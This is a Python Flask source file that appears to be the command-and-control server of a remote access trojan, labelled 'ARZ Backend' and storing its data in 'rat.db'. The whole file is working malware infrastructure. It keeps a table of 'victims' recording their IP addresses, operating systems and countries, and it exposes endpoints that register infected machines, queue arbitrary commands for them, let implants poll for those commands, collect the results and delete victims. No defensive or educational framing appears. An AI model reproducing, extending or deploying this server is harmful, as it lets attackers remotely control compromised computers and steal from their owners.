import os
import sqlite3
import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

def init_db():
    conn = sqlite3.connect('rat.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id TEXT PRIMARY KEY, name TEXT, os TEXT, ip TEXT, country TEXT, last_seen TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, status TEXT, result TEXT, created_at TEXT)''')
    conn.commit()
    conn.close()

# Panggil init_db() SEKALI di sini, sebelum route
init_db()

@app.route('/')
def home():
    return jsonify({'message': 'ARZ Backend Running!'})

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    conn = sqlite3.connect('rat.db')
    c = conn.cursor()
    c.execute('REPLACE INTO victims (id, name, os, ip, country, last_seen, status) VALUES (?, ?, ?, ?, ?, ?, ?)',
              (data['id'], data['name'], data['os'], data['ip'], data['country'], datetime.datetime.now().isoformat(), 'online'))
    conn.commit()
    conn.close()
    return jsonify({'status': 'registered'})

@app.route('/api/victims', methods=['GET'])
def get_victims():
    conn = sqlite3.connect('rat.db')
    c = conn.cursor()
    c.execute('SELECT * FROM victims')
    victims = [{'id': row[0], 'name': row[1], 'os': row[2], 'ip': row[3], 'country': row[4], 'last_seen': row[5], 'status': row[6]} for row in c.fetchall()]
    conn.close()
    return jsonify(victims)

@app.route('/api/cmd', methods=['POST'])
def send_command():
    data = request.json
    conn = sqlite3.connect('rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO commands (victim_id, command, status, result, created_at) VALUES (?, ?, ?, ?, ?)',
              (data['victim_id'], data['command'], 'pending', '', datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'command_sent'})

@app.route('/api/poll', methods=['POST'])
def poll_command():
    data = request.json
    conn = sqlite3.connect('rat.db')
    c = conn.cursor()
    c.execute('SELECT id, command FROM commands WHERE victim_id = ? AND status = "pending" LIMIT 1', (data['id'],))
    row = c.fetchone()
    if row:
        c.execute('UPDATE commands SET status = "sent" WHERE id = ?', (row[0],))
        conn.commit()
        conn.close()
        return jsonify({'command': row[1]})
    conn.close()
    return jsonify({'command': None})

@app.route('/api/result', methods=['POST'])
def send_result():
    data = request.json
    conn = sqlite3.connect('rat.db')
    c = conn.cursor()
    c.execute('''UPDATE commands SET result = ?, status = "done" 
                 WHERE id = (SELECT id FROM commands WHERE victim_id = ? AND status = "sent" ORDER BY created_at DESC LIMIT 1)''',
              (data['result'], data['id']))
    conn.commit()
    conn.close()
    return jsonify({'status': 'result_saved'})

@app.route('/api/delete_victim', methods=['POST'])
def delete_victim():
    data = request.json
    conn = sqlite3.connect('rat.db')
    c = conn.cursor()
    c.execute('DELETE FROM victims WHERE id = ?', (data['id'],))
    c.execute('DELETE FROM commands WHERE victim_id = ?', (data['id'],))
    conn.commit()
    conn.close()
    return jsonify({'status': 'deleted'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
